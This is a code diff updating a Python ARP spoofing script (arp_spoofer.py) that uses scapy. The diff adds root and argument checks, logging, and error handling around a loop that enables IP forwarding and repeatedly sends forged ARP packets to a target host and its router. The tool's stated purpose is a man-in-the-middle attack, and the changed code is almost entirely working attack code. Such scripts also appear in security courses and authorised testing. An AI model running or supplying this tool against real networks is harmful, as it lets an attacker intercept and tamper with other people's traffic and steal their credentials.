@@ -1,9 +1,10 @@
+import argparse
+import logging as log
+import os
 import subprocess
 import sys
-
-import scapy.all as scapy
 import time
-import argparse
+import scapy.all as scapy
 
 
 def get_arguments():
@@ -37,24 +38,36 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
-try:
+if __name__ == '__main__':
+    if not len(sys.argv) == 4:
+        sys.exit('[!] Usage: # python3 arp_spoofer.py -t [target ip] -r [router ip]')
+    if not os.geteuid() == 0:
+        sys.exit('[!] This script must be run as root!')
     subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward ", shell=True)
     sent_packets_counts = 0
     options = get_arguments()
-
     target_ip = options.target_ip
     router_ip = options.router_ip
-
+    log.basicConfig(format='%(asctime)s - %(message)s',
+                    level=log.INFO)
     while True:
-        spoof(target_ip, router_ip)
-        spoof(router_ip, target_ip)
-        sent_packets_counts = sent_packets_counts + 2
-        print("\r[+] Packets Sent : {}".format(str(sent_packets_counts))),
-        sys.stdout.flush()
-        time.sleep(2)
+        try:
+            spoof(target_ip, router_ip)
+            spoof(router_ip, target_ip)
+            sent_packets_counts = sent_packets_counts + 2
+            print("\r[+] [MITM] Packets Sent : {}".format(str(sent_packets_counts))),
+            sys.stdout.flush()
+            time.sleep(2)
+        except KeyboardInterrupt:
+            print("[+] Keyboard Interrupt detected.... Resetting ARP Table")
+            restore(target_ip, router_ip)
+            restore(router_ip, target_ip)
+            print("[+] ARP Table reset done")
+            break
+        except OSError as error:
+            log.error(error)
+            break
+        except IndexError:
+            print("please make sure both hosts are up")
+            break
 
-except KeyboardInterrupt:
-    print("[+] Detected Keyboard Interrupt .... Resetting ARP Table")
-    restore(target_ip, router_ip)
-    restore(router_ip, target_ip)
-    print("[+] ARP Table reset done")
